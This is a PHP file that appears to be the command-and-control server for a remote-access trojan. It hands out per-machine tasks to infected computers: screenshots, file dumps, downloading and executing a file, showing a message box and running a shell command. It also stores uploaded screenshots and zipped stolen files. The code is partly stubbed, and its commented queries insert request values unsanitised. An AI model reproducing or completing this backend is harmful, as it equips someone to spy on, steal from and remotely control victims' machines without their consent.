
    <?php
        if ($_SERVER['REQUEST_METHOD'] === 'GET') {
            if (isset($_GET['getmethenewest'])) {
                //$query1 = mysqli_query("SELECT id FROM todo");
                //$ids = $query1->fetch();
                //foreach ($ids as $id) {
                //    $highestid = $id;
                //}
                //echo $highestid;
                echo "1"; //this requires a link to a database, for the id's and shit of the newest pc, and to also get the fucking data and shit
                // this would be used to declare how to save the file.
                // this part of the soft might be done in python (not sure tho). 
                //this part will most fucking definetly not be done in python what the fuck is wrong with me
            } 
            if (isset($_GET['whatdoido']) && isset($_GET['mynumber'])) {
                //this all gets pulled from a database by the way
                //example query
                //$pcid = $_GET['mynumber']
                // $query = mysqli_fetch("SELECT * FROM todo WHERE pcid=$pcid");
                // $user = $query->fetch();
                echo "1<br>"; //tells you if you want a screenshot $user['screenshot']
                echo "1<br>"; //tells you if you want to dump files and shit $user['dumpem']
                echo "1<br>"; //tells you if there is a file which needs to be downloaded $user['downloadfile']
                echo "PATH<br>"; //where the file is, if no file is to be dl+iex, then just set NULL $user['downloadpath']
                echo "1<br>"; //show messagebox? $user['messagebox']
                echo "MSG<br>"; //what do we put on the messagebox $user['messageforbox']
                echo "1<br>"; //exec a CMD $user['execcmd']
                echo "CMD<br>"; //which cmd to execute $user['toexec']

            }
        }
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                // Check if the file was uploaded without errors
            if (isset($_FILES['image']) && $_FILES['image']['error'] === UPLOAD_ERR_OK) {
                // Directory to save uploaded images
                $uploadDir = 'irevoshell/';
                
                // Ensure the directory exists
                
                // Get file details
                $fileTmpPath = $_FILES['image']['tmp_name'];
                $fileName = basename($_FILES['image']['name']); // Get the base name of the uploaded file
                $fileSize = $_FILES['image']['size'];
                $fileType = $_FILES['image']['type'];

                // Define the target file path
                $targetFilePath = $uploadDir . $_POST['id'] . ".jpeg";

                // Check file type (optional, for security)
                $allowedMimeTypes = ['image/jpeg', 'image/png', 'image/gif'];
                if (!in_array($fileType, $allowedMimeTypes)) {
                    echo "Error: Only JPEG, PNG, and GIF files are allowed.";
                    exit;
                }

                // Move the uploaded file to the target directory
                if (move_uploaded_file($fileTmpPath, $targetFilePath)) {
                    echo "The image has been uploaded successfully!";
                } else {
                    echo "Error: Unable to save the uploaded image.";
                }
            }
            if (isset($_FILES['dump']) && $_FILES['dump']['error'] === UPLOAD_ERR_OK) {
                // Directory to save uploaded images
                $uploadDir = 'irevoshell/';
                
                // Ensure the directory exists
                
                // Get file details
                $fileTmpPath = $_FILES['dump']['tmp_name'];
                $fileName = basename($_FILES['dump']['name']); // Get the base name of the uploaded file
                $fileSize = $_FILES['dump']['size'];
                $fileType = $_FILES['dump']['type'];

                // Define the target file path
                $targetFilePath = $uploadDir . "dump-" . $_POST['id'] . ".zip";

                // Check file type (optional, for security)
                $allowedMimeTypes = ['application/zip', 'application/x-zip-compressed', 'multipart/x-zip'];
                if (!in_array($fileType, $allowedMimeTypes)) {
                    echo "Error: Only ZIP files are allowed.";
                    exit;
                }

                // Move the uploaded file to the target directory
                if (move_uploaded_file($fileTmpPath, $targetFilePath)) {
                    echo "The ZIP file has been uploaded successfully!";
                } else {
                    echo "Error: Unable to save the uploaded ZIP file.";
                }
            }
        }
        ?>